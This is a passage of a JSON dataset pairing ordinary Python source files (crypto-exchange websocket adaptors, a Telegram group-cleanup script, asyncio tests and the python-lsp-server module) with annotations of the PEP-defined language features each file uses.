                "pep_567": [
                    [
                        1,
                        1,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        49,
                        52,
                        "async for",
                        "async for ws_response in ws.iter_messages():\n                    data = ws_response.data\n                    if data.get(\"type\", \"\") in [\"subscribed\", \"channel_data\"]:\n                        output.put_nowait(data)"
                    ]
                ],
                "pep_498": [
                    [
                        42,
                        "                self.logger().info(f\"Connecting to {CONSTANTS.DYDX_WS_URL}\")"
                    ]
                ]
            }
        },
        "158": {
            "file": "from telethon import TelegramClient\nfrom telethon.tl.functions.channels import EditBannedRequest\nfrom telethon.tl.types import ChatBannedRights\nimport asyncio\nimport datetime\napi_id = 1234 \napi_hash = \"\" \nasync def clear_chat(client):\n    group = input(\"Enter the group username where the script should search for deleted accounts: \")\n    deleted_accounts = 0\n    async for user in client.iter_participants(group):\n        if user.deleted:\n            try:\n                deleted_accounts += 1\n                await client(EditBannedRequest(group, user, ChatBannedRights(\n                   until_date=datetime.timedelta(minutes=1),\n                   view_messages=True\n                   )))\n            except Exception as exc:\n                print(f\"Failed to kick one deleted account because: {str(exc)}\")\n    if deleted_accounts:\n        print(f\"Kicked {deleted_accounts} Deleted Accounts\")\n    else:\n        print(f\"No deleted accounts found in {group}\")\nwith TelegramClient(\"deleteacc\", api_id, api_hash) as client:\n    asyncio.get_event_loop().run_until_complete(clear_chat(client))",
            "patterns": {
                "pep_567": [
                    [
                        4,
                        4,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        11,
                        20,
                        "async for",
                        "async for user in client.iter_participants(group):\n        if user.deleted:\n            try:\n                deleted_accounts += 1\n                await client(EditBannedRequest(group, user, ChatBannedRights(\n                   until_date=datetime.timedelta(minutes=1),\n                   view_messages=True\n                   )))\n            except Exception as exc:\n                print(f\"Failed to kick one deleted account because: {str(exc)}\")"
                    ]
                ],
                "pep_498": [
                    [
                        22,
                        "        print(f\"Kicked {deleted_accounts} Deleted Accounts\")"
                    ],
                    [
                        24,
                        "        print(f\"No deleted accounts found in {group}\")"
                    ],
                    [
                        20,
                        "                print(f\"Failed to kick one deleted account because: {str(exc)}\")"
                    ]
                ]
            }
        },
        "159": {
            "file": "import asyncio\nclass Session(object):\n    @classmethod\n    def connect(cls):\n        return Session()\n    async def __aenter__(self):\n        print(\"Creating session...\")\n        await asyncio.sleep(1)\n        return self\n    async def __aexit__(self, exc_typ, exc, tb):\n        await asyncio.sleep(1)\n        print(\"Disconnected.\")\n    async def __aiter__(self):\n        self.records = [Record(), Record()]\n        return self\n    async def __anext__(self):\n        print(\"Finding record...\")\n        await asyncio.sleep(1)\n        if not self.records:\n            raise StopAsyncIteration()\n        return self.records.pop(0)\n    def find(self):\n        return self\nclass Record(object):\n    async def update(self, **kwargs):\n        await asyncio.sleep(1)\n        print(\"Updating record: {0}\".format(kwargs))\nasync def wait():\n    async with Session.connect() as session:\n        i = 0\n        async for record in session.find():\n            i += 1\n            await record.update(foo=i)\ndef main():\n    loop = asyncio.get_event_loop()\n    print(\"Starting...\")\n    loop.run_until_complete(wait())\n    print(\"Finishing...\")\n    loop.close()\nif __name__ == \"__main__\":\n    main()",
            "patterns": {
                "pep_567": [
                    [
                        1,
                        1,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        31,
                        33,
                        "async for",
                        "async for record in session.find():\n            i += 1\n            await record.update(foo=i)"
                    ]
                ],
                "pep_498v": [
                    [
                        27,
                        27,
                        ".format()"
                    ]
                ]
            }
        },
        "160": {
            "file": "import asyncio\nimport pytest\nfrom blspy import PrivateKey\nfrom src.util.hash import std_hash\nfrom src.util.validate_alert import create_alert_file, create_not_ready_alert_file\nfrom tests.setup_nodes import setup_daemon\nfrom tests.util.alert_server import AlertServer\nfrom tests.time_out_assert import time_out_assert\nmaster_int = 5399117110774477986698372024995405256382522670366369834617409486544348441851\nmaster_sk: PrivateKey = PrivateKey.from_bytes(master_int.to_bytes(32, \"big\"))\npubkey_alert = bytes(master_sk.get_g1()).hex()\nclass TestDaemonAlerts:\n    @pytest.fixture(scope=\"function\")\n    async def get_daemon(self):\n        async for _ in setup_daemon(55401, \"http://127.0.0.1:59000/status\", pubkey_alert):\n            yield _\n    @pytest.mark.asyncio\n    async def test_alert(self, get_daemon):\n        daemon = get_daemon\n        selected = daemon.net_config[\"selected_network\"]\n        assert daemon.net_config[\"network_overrides\"][\"constants\"][selected][\"GENESIS_CHALLENGE\"] is None\n        alert_file_path = daemon.root_path / \"alert.txt\"\n        alert_server = await AlertServer.create_alert_server(alert_file_path, 59000)\n        create_not_ready_alert_file(alert_file_path, master_sk)\n        await alert_server.run()\n        expected_genesis = None\n        def check_genesis(expected):\n            return daemon.net_config[\"network_overrides\"][\"constants\"][selected][\"GENESIS_CHALLENGE\"] == expected\n        await asyncio.sleep(10)\n        await time_out_assert(15, check_genesis, True, expected_genesis)\n        preimage = \"This is test preimage!\"\n        expected_genesis = std_hash(bytes(preimage, \"utf-8\")).hex()\n        alert_file_path.unlink()\n        create_alert_file(alert_file_path, master_sk, \"This is test preimage!\")\n        await time_out_assert(15, check_genesis, True, expected_genesis)",
            "patterns": {
                "pep_526": [
                    [
                        10,
                        "master_sk: PrivateKey = PrivateKey.from_bytes(master_int.to_bytes(32, \"big\"))"
                    ]
                ],
                "pep_567": [
                    [
                        1,
                        1,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        14,
                        16,
                        "async generator",
                        "async def get_daemon(self):\n        async for _ in setup_daemon(55401, \"http://127.0.0.1:59000/status\", pubkey_alert):\n            yield _"
                    ],
                    [
                        15,
                        16,
                        "async for",
                        "async for _ in setup_daemon(55401, \"http://127.0.0.1:59000/status\", pubkey_alert):\n            yield _"
                    ]
                ]
            }
        },
        "161": {
            "file": "import aiohttp\nimport asyncio\nfrom typing import AsyncIterable, Dict, Any, Optional, List\nimport hummingbot.connector.derivative.bybit_perpetual.bybit_perpetual_constants as CONSTANTS\nclass BybitPerpetualWebSocketAdaptor:\n    _topic_field_name = \"topic\"\n    _operation_field_name = \"op\"\n    _payload_field_name = \"args\"\n    _authentication_operation = \"auth\"\n    _subscription_operation = \"subscribe\"\n    MESSAGE_TIMEOUT = 30.0\n    PING_TIMEOUT = 5.0\n    def __init__(self, websocket: aiohttp.ClientWebSocketResponse):\n        self._websocket = websocket\n    @classmethod\n    def endpoint_from_message(cls, message: Dict[str, Any]) -> str:\n        if not isinstance(message, dict):\n            return message\n        if cls._operation_field_name in message.keys():\n            if message[cls._operation_field_name] is cls._subscription_operation:\n                return message[cls._payload_field_name][0]\n            else:\n                return message[cls._operation_field_name]\n        if cls._topic_field_name in message.keys():\n            return message[cls._topic_field_name]\n    @classmethod\n    def payload_from_message(cls, message: Dict[str, Any]) -> List[Dict[str, Any]]:\n        if \"data\" in message:\n            return message[\"data\"]\n        return message\n    async def send_request(self, payload: Dict[str, Any]):\n        await self._websocket.send_json(payload)\n    def _symbols_filter(self, symbols):\n        if symbols:\n            symbol_filter = \"|\".join(symbols)\n        else:\n            symbol_filter = \"*\"\n        return symbol_filter\n    async def authenticate(self, payload: Dict[str, Any]):\n        authentication_message = {self._operation_field_name: self._authentication_operation,\n                                  self._payload_field_name: payload}\n        await self.send_request(authentication_message)\n    async def subscribe_to_order_book(self, symbols: Optional[List[str]] = None):\n        symbol_filter = self._symbols_filter(symbols)\n        subscription_message = {self._operation_field_name: self._subscription_operation,\n                                self._payload_field_name: [f\"{CONSTANTS.WS_ORDER_BOOK_EVENTS_TOPIC}.{symbol_filter}\"]}\n        await self.send_request(subscription_message)\n    async def subscribe_to_trades(self, symbols: Optional[List[str]] = None):\n        symbol_filter = self._symbols_filter(symbols)\n        subscription_message = {self._operation_field_name: self._subscription_operation,\n                                self._payload_field_name: [f\"{CONSTANTS.WS_TRADES_TOPIC}.{symbol_filter}\"]}\n        await self.send_request(subscription_message)\n    async def subscribe_to_instruments_info(self, symbols: Optional[List[str]] = None):\n        symbol_filter = self._symbols_filter(symbols)\n        subscription_message = {self._operation_field_name: self._subscription_operation,\n                                self._payload_field_name: [f\"{CONSTANTS.WS_INSTRUMENTS_INFO_TOPIC}.{symbol_filter}\"]}\n        await self.send_request(subscription_message)\n    async def subscribe_to_positions(self):\n        subscription_message = {self._operation_field_name: self._subscription_operation,\n                                self._payload_field_name: [f\"{CONSTANTS.WS_SUBSCRIPTION_POSITIONS_ENDPOINT_NAME}\"]}\n        await self.send_request(subscription_message)\n    async def subscribe_to_orders(self):\n        subscription_message = {self._operation_field_name: self._subscription_operation,\n                                self._payload_field_name: [f\"{CONSTANTS.WS_SUBSCRIPTION_ORDERS_ENDPOINT_NAME}\"]}\n        await self.send_request(subscription_message)\n    async def subscribe_to_executions(self):\n        subscription_message = {self._operation_field_name: self._subscription_operation,\n                                self._payload_field_name: [f\"{CONSTANTS.WS_SUBSCRIPTION_EXECUTIONS_ENDPOINT_NAME}\"]}\n        await self.send_request(subscription_message)\n    async def receive_str(self, *args, **kwars):\n        return await self._websocket.receive_str(*args, **kwars)\n    async def receive_json(self, *args, **kwars):\n        return await self._websocket.receive_json(*args, **kwars)\n    async def iter_messages(self) -> AsyncIterable[Dict[str, Any]]:\n        try:\n            while True:\n                try:\n                    msg = await self.receive_json(timeout=self.MESSAGE_TIMEOUT)\n                    yield msg\n                except asyncio.TimeoutError:\n                    await asyncio.wait_for(\n                        self.send_request(payload={self._operation_field_name: CONSTANTS.WS_PING_REQUEST}),\n                        timeout=self.PING_TIMEOUT\n                    )\n        finally:\n            await self.close()\n    async def close(self, *args, **kwars):\n        return await self._websocket.close(*args, **kwars)",
            "patterns": {
                "pep_468": [
                    [
                        71,
                        "self._websocket.receive_str(*args, **kwars)"
                    ],
                    [
                        73,
                        "self._websocket.receive_json(*args, **kwars)"
                    ],
                    [
                        88,
                        "self._websocket.close(*args, **kwars)"
                    ]
                ],
                "pep_567": [
                    [
                        2,
                        2,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_585": [
                    [
                        3,
                        "from typing import AsyncIterable, Dict, Any, Optional, List",
                        "suggestion"
                    ],
                    [
                        3,
                        "from typing import AsyncIterable, Dict, Any, Optional, List",
                        "suggestion"
                    ]
                ],
                "pep_585v": [
                    [
                        16,
                        "    def endpoint_from_message(cls, message: Dict[str, Any]) -> str:",
                        "violation"
                    ],
                    [
                        27,
                        "    def payload_from_message(cls, message: Dict[str, Any]) -> List[Dict[str, Any]]:",
                        "violation"
                    ]
                ],
                "pep_525": [
                    [
                        74,
                        86,
                        "async generator",
                        "async def iter_messages(self) -> AsyncIterable[Dict[str, Any]]:\n        try:\n            while True:\n                try:\n                    msg = await self.receive_json(timeout=self.MESSAGE_TIMEOUT)\n                    yield msg\n                except asyncio.TimeoutError:\n                    await asyncio.wait_for(\n                        self.send_request(payload={self._operation_field_name: CONSTANTS.WS_PING_REQUEST}),\n                        timeout=self.PING_TIMEOUT\n                    )\n        finally:\n            await self.close()"
                    ]
                ],
                "pep_498": [
                    [
                        46,
                        "                                self._payload_field_name: [f\"{CONSTANTS.WS_ORDER_BOOK_EVENTS_TOPIC}.{symbol_filter}\"]}"
                    ],
                    [
                        51,
                        "                                self._payload_field_name: [f\"{CONSTANTS.WS_TRADES_TOPIC}.{symbol_filter}\"]}"
                    ],
                    [
                        56,
                        "                                self._payload_field_name: [f\"{CONSTANTS.WS_INSTRUMENTS_INFO_TOPIC}.{symbol_filter}\"]}"
                    ],
                    [
                        60,
                        "                                self._payload_field_name: [f\"{CONSTANTS.WS_SUBSCRIPTION_POSITIONS_ENDPOINT_NAME}\"]}"
                    ],
                    [
                        64,
                        "                                self._payload_field_name: [f\"{CONSTANTS.WS_SUBSCRIPTION_ORDERS_ENDPOINT_NAME}\"]}"
                    ],
                    [
                        68,
                        "                                self._payload_field_name: [f\"{CONSTANTS.WS_SUBSCRIPTION_EXECUTIONS_ENDPOINT_NAME}\"]}"
                    ]
                ]
            }
        },
        "162": {
            "file": "import asyncio\nfrom collections import defaultdict\nfrom typing import List, Tuple\nimport pytest\nfrom ..... import oscar as mo\nfrom .....typing import BandType\nfrom ....cluster import MockClusterAPI\nfrom ....subtask import Subtask, SubtaskResult, SubtaskStatus\nfrom ....task.supervisor.manager import TaskManagerActor\nfrom ...supervisor import SubtaskQueueingActor, SubtaskManagerActor, \\\n    GlobalSlotManagerActor\nfrom ...worker import SubtaskExecutionActor\nclass MockTaskManagerActor(mo.Actor):\n    def __init__(self):\n        self._results = dict()\n    def set_subtask_result(self, result: SubtaskResult):\n        self._results[result.subtask_id] = result\n    def get_result(self, subtask_id: str) -> SubtaskResult:\n        return self._results[subtask_id]\nclass MockSubtaskQueueingActor(mo.Actor):\n    def __init__(self):\n        self._subtasks = dict()\n        self._error = None\n    def add_subtasks(self, subtasks: List[Subtask], priorities: List[Tuple]):\n        if self._error is not None:\n            raise self._error\n        for subtask, priority in zip(subtasks, priorities):\n            self._subtasks[subtask.subtask_id] = (subtask, priority)\n    def submit_subtasks(self, band: BandType, limit: int):\n        pass\n    def remove_queued_subtasks(self, subtask_ids: List[str]):\n        for stid in subtask_ids:\n            self._subtasks.pop(stid)\n    def set_error(self, error):\n        self._error = error\nclass MockSubtaskExecutionActor(mo.Actor):\n    def __init__(self):\n        self._subtask_aiotasks = defaultdict(dict)\n    async def run_subtask(self, subtask: Subtask, band_name: str, supervisor_address: str):\n        task = self._subtask_aiotasks[subtask.subtask_id][band_name] = \\\n            asyncio.create_task(asyncio.sleep(20))\n        return task\n    def cancel_subtask(self, subtask_id: str, kill_timeout: int = 5):\n        for task in self._subtask_aiotasks[subtask_id].values():\n            task.cancel()\n    async def wait_subtask(self, subtask_id: str, band_name: str):\n        try:\n            yield self._subtask_aiotasks[subtask_id][band_name]\n        except asyncio.CancelledError:\n            pass\n@pytest.fixture\nasync def actor_pool():\n    pool = await mo.create_actor_pool('127.0.0.1', n_process=0)\n    async with pool:\n        session_id = 'test_session'\n        await MockClusterAPI.create(pool.external_address)\n        queue_ref = await mo.create_actor(\n            MockSubtaskQueueingActor, uid=SubtaskQueueingActor.gen_uid(session_id),\n            address=pool.external_address)\n        slots_ref = await mo.create_actor(\n            GlobalSlotManagerActor, uid=GlobalSlotManagerActor.default_uid(),\n            address=pool.external_address)\n        task_manager_ref = await mo.create_actor(\n            MockTaskManagerActor, uid=TaskManagerActor.gen_uid(session_id),\n            address=pool.external_address)\n        execution_ref = await mo.create_actor(\n            MockSubtaskExecutionActor,\n            uid=SubtaskExecutionActor.default_uid(),\n            address=pool.external_address)\n        submitter_ref = await mo.create_actor(\n            SubtaskManagerActor, session_id, uid=SubtaskManagerActor.gen_uid(session_id),\n            address=pool.external_address)\n        yield pool, session_id, execution_ref, submitter_ref, queue_ref, task_manager_ref\n        await mo.destroy_actor(slots_ref)\n        await MockClusterAPI.cleanup(pool.external_address)\n@pytest.mark.asyncio\nasync def test_subtask_manager(actor_pool):\n    pool, session_id, execution_ref, manager_ref, queue_ref, task_manager_ref = actor_pool\n    subtask1 = Subtask('subtask1', session_id)\n    subtask2 = Subtask('subtask2', session_id)\n    await manager_ref.add_subtasks([subtask1, subtask2], [(1,), (2,)])\n    await manager_ref.submit_subtask_to_band(\n        subtask1.subtask_id, (pool.external_address, 'gpu-0'))\n    await manager_ref.submit_subtask_to_band(\n        subtask1.subtask_id, (pool.external_address, 'gpu-1'))\n    await manager_ref.cancel_subtasks([subtask1.subtask_id, subtask2.subtask_id])\n    await asyncio.wait_for(\n        asyncio.gather(\n            execution_ref.wait_subtask(subtask1.subtask_id, 'gpu-0'),\n            execution_ref.wait_subtask(subtask1.subtask_id, 'gpu-1'),\n        ), timeout=10)\n    assert (await task_manager_ref.get_result(subtask1.subtask_id)).status \\\n           == SubtaskStatus.cancelled\n    assert (await task_manager_ref.get_result(subtask2.subtask_id)).status \\\n           == SubtaskStatus.cancelled\n    subtask3 = Subtask('subtask3', session_id)\n    await queue_ref.set_error(ValueError())\n    await manager_ref.add_subtasks.tell([subtask3], [(3,)])\n    await asyncio.sleep(0.1)\n    subtask3_result = await task_manager_ref.get_result(subtask3.subtask_id)\n    assert subtask3_result.status == SubtaskStatus.errored\n    assert isinstance(subtask3_result.error, ValueError)",
            "patterns": {
                "pep_567": [
                    [
                        1,
                        1,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_585": [
                    [
                        3,
                        "from typing import List, Tuple",
                        "suggestion"
                    ],
                    [
                        3,
                        "from typing import List, Tuple",
                        "suggestion"
                    ]
                ],
                "pep_585v": [
                    [
                        24,
                        "    def add_subtasks(self, subtasks: List[Subtask], priorities: List[Tuple]):",
                        "violation"
                    ],
                    [
                        31,
                        "    def remove_queued_subtasks(self, subtask_ids: List[str]):",
                        "violation"
                    ]
                ],
                "pep_525": [
                    [
                        52,
                        75,
                        "async generator",
                        "async def actor_pool():\n    pool = await mo.create_actor_pool('127.0.0.1', n_process=0)\n    async with pool:\n        session_id = 'test_session'\n        await MockClusterAPI.create(pool.external_address)\n        queue_ref = await mo.create_actor(\n            MockSubtaskQueueingActor, uid=SubtaskQueueingActor.gen_uid(session_id),\n            address=pool.external_address)\n        slots_ref = await mo.create_actor(\n            GlobalSlotManagerActor, uid=GlobalSlotManagerActor.default_uid(),\n            address=pool.external_address)\n        task_manager_ref = await mo.create_actor(\n            MockTaskManagerActor, uid=TaskManagerActor.gen_uid(session_id),\n            address=pool.external_address)\n        execution_ref = await mo.create_actor(\n            MockSubtaskExecutionActor,\n            uid=SubtaskExecutionActor.default_uid(),\n            address=pool.external_address)\n        submitter_ref = await mo.create_actor(\n            SubtaskManagerActor, session_id, uid=SubtaskManagerActor.gen_uid(session_id),\n            address=pool.external_address)\n        yield pool, session_id, execution_ref, submitter_ref, queue_ref, task_manager_ref\n        await mo.destroy_actor(slots_ref)\n        await MockClusterAPI.cleanup(pool.external_address)"
                    ],
                    [
                        46,
                        50,
                        "async generator",
                        "async def wait_subtask(self, subtask_id: str, band_name: str):\n        try:\n            yield self._subtask_aiotasks[subtask_id][band_name]\n        except asyncio.CancelledError:\n            pass"
                    ]
                ]
            }
        },
        "163": {
            "file": "from functools import partial\nimport logging\nimport os\nimport socketserver\nimport threading\nimport ujson as json\nfrom pylsp_jsonrpc.dispatchers import MethodDispatcher\nfrom pylsp_jsonrpc.endpoint import Endpoint\nfrom pylsp_jsonrpc.streams import JsonRpcStreamReader, JsonRpcStreamWriter\nfrom . import lsp, _utils, uris\nfrom .config import config\nfrom .workspace import Workspace\nfrom ._version import __version__\nlog = logging.getLogger(__name__)\nLINT_DEBOUNCE_S = 0.5  \nPARENT_PROCESS_WATCH_INTERVAL = 10  \nMAX_WORKERS = 64\nPYTHON_FILE_EXTENSIONS = ('.py', '.pyi')\nCONFIG_FILEs = ('pycodestyle.cfg', 'setup.cfg', 'tox.ini', '.flake8')\nclass _StreamHandlerWrapper(socketserver.StreamRequestHandler):\n    delegate = None\n    def setup(self):\n        super().setup()\n        self.delegate = self.DELEGATE_CLASS(self.rfile, self.wfile)\n    def handle(self):\n        try:\n            self.delegate.start()\n        except OSError as e:\n            if os.name == 'nt':\n                if isinstance(e, WindowsError) and e.winerror == 10054:\n                    pass\n        self.SHUTDOWN_CALL()\ndef start_tcp_lang_server(bind_addr, port, check_parent_process, handler_class):\n    if not issubclass(handler_class, PythonLSPServer):\n        raise ValueError('Handler class must be an instance of PythonLSPServer')\n    def shutdown_server(check_parent_process, *args):\n        if check_parent_process:\n            log.debug('Shutting down server')\n            stop_thread = threading.Thread(target=server.shutdown)\n            stop_thread.start()\n    wrapper_class = type(\n        handler_class.__name__ + 'Handler',\n        (_StreamHandlerWrapper,),\n        {'DELEGATE_CLASS': partial(handler_class,\n                                   check_parent_process=check_parent_process),\n         'SHUTDOWN_CALL': partial(shutdown_server, check_parent_process)}\n    )\n    server = socketserver.TCPServer((bind_addr, port), wrapper_class, bind_and_activate=False)\n    server.allow_reuse_address = True\n    try:\n        server.server_bind()\n        server.server_activate()\n        log.info('Serving %s on (%s, %s)', handler_class.__name__, bind_addr, port)\n        server.serve_forever()\n    finally:\n        log.info('Shutting down')\n        server.server_close()\ndef start_io_lang_server(rfile, wfile, check_parent_process, handler_class):\n    if not issubclass(handler_class, PythonLSPServer):\n        raise ValueError('Handler class must be an instance of PythonLSPServer')\n    log.info('Starting %s IO language server', handler_class.__name__)\n    server = handler_class(rfile, wfile, check_parent_process)\n    server.start()\ndef start_ws_lang_server(port, check_parent_process, handler_class):\n    if not issubclass(handler_class, PythonLSPServer):\n        raise ValueError('Handler class must be an instance of PythonLSPServer')\n    try:\n        import asyncio\n        from concurrent.futures import ThreadPoolExecutor\n        import websockets\n    except ImportError as e:\n        raise ImportError(\"websocket modules missing. Please run pip install 'python-lsp-server[websockets]\") from e\n    with ThreadPoolExecutor(max_workers=10) as tpool:\n        async def pylsp_ws(websocket):\n            log.debug(\"Creating LSP object\")\n            response_handler = partial(send_message, websocket=websocket)\n            pylsp_handler = handler_class(rx=None, tx=None, consumer=response_handler,\n                                          check_parent_process=check_parent_process)\n            async for message in websocket:\n                try:\n                    log.debug(\"consuming payload and feeding it to LSP handler\")\n                    request = json.loads(message)\n                    loop = asyncio.get_running_loop()\n                    await loop.run_in_executor(tpool, pylsp_handler.consume, request)\n                except Exception as e:  \n                    log.exception(\"Failed to process request %s, %s\", message, str(e))\n        def send_message(message, websocket):\n            try:\n                payload = json.dumps(message, ensure_ascii=False)\n                asyncio.run(websocket.send(payload))\n            except Exception as e:  \n                log.exception(\"Failed to write message %s, %s\", message, str(e))\n        async def run_server():\n            async with websockets.serve(pylsp_ws, port=port):\n                await asyncio.Future()\n        asyncio.run(run_server())\nclass PythonLSPServer(MethodDispatcher):\n    def __init__(self, rx, tx, check_parent_process=False, consumer=None, *, endpoint_cls=None):\n        self.workspace = None\n        self.config = None\n        self.root_uri = None\n        self.watching_thread = None\n        self.workspaces = {}\n        self.uri_workspace_mapper = {}\n        self._check_parent_process = check_parent_process\n        if rx is not None:\n            self._jsonrpc_stream_reader = JsonRpcStreamReader(rx)\n        else:\n            self._jsonrpc_stream_reader = None\n        if tx is not None:\n            self._jsonrpc_stream_writer = JsonRpcStreamWriter(tx)\n        else:\n            self._jsonrpc_stream_writer = None\n        endpoint_cls = endpoint_cls or Endpoint\n        if consumer is None:\n            self._endpoint = endpoint_cls(self, self._jsonrpc_stream_writer.write, max_workers=MAX_WORKERS)\n        else:\n            self._endpoint = endpoint_cls(self, consumer, max_workers=MAX_WORKERS)\n        self._dispatchers = []\n        self._shutdown = False\n    def start(self):\n        self._jsonrpc_stream_reader.listen(self._endpoint.consume)\n    def consume(self, message):\n        self._endpoint.consume(message)\n    def __getitem__(self, item):\n        if self._shutdown and item != 'exit':\n            log.debug(\"Ignoring non-exit method during shutdown: %s\", item)\n            raise KeyError\n        try:\n            return super().__getitem__(item)\n        except KeyError:\n            for dispatcher in self._dispatchers:\n                try:\n                    return dispatcher[item]\n                except KeyError:\n                    continue\n        raise KeyError()\n    def m_shutdown(self, **_kwargs):\n        for workspace in self.workspaces.values():\n            workspace.close()\n        self._shutdown = True\n    def m_exit(self, **_kwargs):\n        self._endpoint.shutdown()\n        if self._jsonrpc_stream_reader is not None:\n            self._jsonrpc_stream_reader.close()\n        if self._jsonrpc_stream_writer is not None:\n            self._jsonrpc_stream_writer.close()\n    def _match_uri_to_workspace(self, uri):\n        workspace_uri = _utils.match_uri_to_workspace(uri, self.workspaces)\n        return self.workspaces.get(workspace_uri, self.workspace)\n    def _hook(self, hook_name, doc_uri=None, **kwargs):\n        workspace = self._match_uri_to_workspace(doc_uri)\n        doc = workspace.get_document(doc_uri) if doc_uri else None\n        hook_handlers = self.config.plugin_manager.subset_hook_caller(hook_name, self.config.disabled_plugins)\n        return hook_handlers(config=self.config, workspace=workspace, document=doc, **kwargs)\n    def capabilities(self):\n        server_capabilities = {\n            'codeActionProvider': True,\n            'codeLensProvider': {\n                'resolveProvider': False,  \n            },\n            'completionProvider': {\n                'resolveProvider': True,  \n                'triggerCharacters': ['.'],\n            },\n            'documentFormattingProvider': True,\n            'documentHighlightProvider': True,\n            'documentRangeFormattingProvider': True,\n            'documentSymbolProvider': True,\n            'definitionProvider': True,\n            'executeCommandProvider': {\n                'commands': flatten(self._hook('pylsp_commands'))\n            },\n            'hoverProvider': True,\n            'referencesProvider': True,\n            'renameProvider': True,\n            'foldingRangeProvider': True,\n            'signatureHelpProvider': {\n                'triggerCharacters': ['(', ',', '=']\n            },\n            'textDocumentSync': {\n                'change': lsp.TextDocumentSyncKind.INCREMENTAL,\n                'save': {\n                    'includeText': True,\n                },\n                'openClose': True,\n            },\n            'workspace': {\n                'workspaceFolders': {\n                    'supported': True,\n                    'changeNotifications': True\n                }\n            },\n            'experimental': merge(\n                self._hook('pylsp_experimental_capabilities'))\n        }\n        log.info('Server capabilities: %s', server_capabilities)\n        return server_capabilities\n    def m_initialize(self, processId=None, rootUri=None, rootPath=None,\n                     initializationOptions=None, workspaceFolders=None, **_kwargs):\n        log.debug('Language server initialized with %s %s %s %s', processId, rootUri, rootPath, initializationOptions)\n        if rootUri is None:\n            rootUri = uris.from_fs_path(rootPath) if rootPath is not None else ''\n        self.workspaces.pop(self.root_uri, None)\n        self.root_uri = rootUri\n        self.config = config.Config(rootUri, initializationOptions or {},\n                                    processId, _kwargs.get('capabilities', {}))\n        self.workspace = Workspace(rootUri, self._endpoint, self.config)\n        self.workspaces[rootUri] = self.workspace\n        if workspaceFolders:\n            for folder in workspaceFolders:\n                uri = folder['uri']\n                if uri == rootUri:\n                    continue\n                workspace_config = config.Config(\n                    uri, self.config._init_opts,\n                    self.config._process_id, self.config._capabilities)\n                workspace_config.update(self.config._settings)\n                self.workspaces[uri] = Workspace(\n                    uri, self._endpoint, workspace_config)\n        self._dispatchers = self._hook('pylsp_dispatchers')\n        self._hook('pylsp_initialize')\n        if self._check_parent_process and processId is not None and self.watching_thread is None:\n            def watch_parent_process(pid):\n                if not _utils.is_process_alive(pid):\n                    log.info(\"parent process %s is not alive, exiting!\", pid)\n                    self.m_exit()\n                else:\n                    threading.Timer(PARENT_PROCESS_WATCH_INTERVAL, watch_parent_process, args=[pid]).start()\n            self.watching_thread = threading.Thread(target=watch_parent_process, args=(processId,))\n            self.watching_thread.daemon = True\n            self.watching_thread.start()\n        return {\n            'capabilities': self.capabilities(),\n            'serverInfo': {\n                'name': 'pylsp',\n                'version': __version__,\n            },\n        }\n    def m_initialized(self, **_kwargs):\n        self._hook('pylsp_initialized')\n    def code_actions(self, doc_uri, range, context):\n        return flatten(self._hook('pylsp_code_actions', doc_uri, range=range, context=context))\n    def code_lens(self, doc_uri):\n        return flatten(self._hook('pylsp_code_lens', doc_uri))\n    def completions(self, doc_uri, position):\n        completions = self._hook('pylsp_completions', doc_uri, position=position)\n        return {\n            'isIncomplete': False,\n            'items': flatten(completions)\n        }\n    def completion_item_resolve(self, completion_item):\n        doc_uri = completion_item.get('data', {}).get('doc_uri', None)\n        return self._hook('pylsp_completion_item_resolve', doc_uri, completion_item=completion_item)\n    def definitions(self, doc_uri, position):\n        return flatten(self._hook('pylsp_definitions', doc_uri, position=position))\n    def document_symbols(self, doc_uri):\n        return flatten(self._hook('pylsp_document_symbols', doc_uri))\n    def document_did_save(self, doc_uri):\n        return self._hook(\"pylsp_document_did_save\", doc_uri)\n    def execute_command(self, command, arguments):\n        return self._hook('pylsp_execute_command', command=command, arguments=arguments)\n    def format_document(self, doc_uri, options):\n        return lambda: self._hook('pylsp_format_document', doc_uri, options=options)\n    def format_range(self, doc_uri, range, options):\n        return self._hook('pylsp_format_range', doc_uri, range=range, options=options)\n    def highlight(self, doc_uri, position):\n        return flatten(self._hook('pylsp_document_highlight', doc_uri, position=position)) or None\n    def hover(self, doc_uri, position):\n        return self._hook('pylsp_hover', doc_uri, position=position) or {'contents': ''}\n    @_utils.debounce(LINT_DEBOUNCE_S, keyed_by='doc_uri')\n    def lint(self, doc_uri, is_saved):\n        workspace = self._match_uri_to_workspace(doc_uri)\n        if doc_uri in workspace.documents:\n            workspace.publish_diagnostics(\n                doc_uri,\n                flatten(self._hook('pylsp_lint', doc_uri, is_saved=is_saved))\n            )\n    def references(self, doc_uri, position, exclude_declaration):\n        return flatten(self._hook(\n            'pylsp_references', doc_uri, position=position,\n            exclude_declaration=exclude_declaration\n        ))\n    def rename(self, doc_uri, position, new_name):\n        return self._hook('pylsp_rename', doc_uri, position=position, new_name=new_name)\n    def signature_help(self, doc_uri, position):\n        return self._hook('pylsp_signature_help', doc_uri, position=position)\n    def folding(self, doc_uri):\n        return flatten(self._hook('pylsp_folding_range', doc_uri))\n    def m_completion_item__resolve(self, **completionItem):\n        return self.completion_item_resolve(completionItem)\n    def m_text_document__did_close(self, textDocument=None, **_kwargs):\n        workspace = self._match_uri_to_workspace(textDocument['uri'])\n        workspace.publish_diagnostics(textDocument['uri'], [])\n        workspace.rm_document(textDocument['uri'])\n    def m_text_document__did_open(self, textDocument=None, **_kwargs):\n        workspace = self._match_uri_to_workspace(textDocument['uri'])\n        workspace.put_document(textDocument['uri'], textDocument['text'], version=textDocument.get('version'))\n        self._hook('pylsp_document_did_open', textDocument['uri'])\n        self.lint(textDocument['uri'], is_saved=True)\n    def m_text_document__did_change(self, contentChanges=None, textDocument=None, **_kwargs):\n        workspace = self._match_uri_to_workspace(textDocument['uri'])\n        for change in contentChanges:\n            workspace.update_document(\n                textDocument['uri'],\n                change,\n                version=textDocument.get('version')\n            )\n        self.lint(textDocument['uri'], is_saved=False)\n    def m_text_document__did_save(self, textDocument=None, **_kwargs):\n        self.lint(textDocument['uri'], is_saved=True)\n        self.document_did_save(textDocument['uri'])\n    def m_text_document__code_action(self, textDocument=None, range=None, 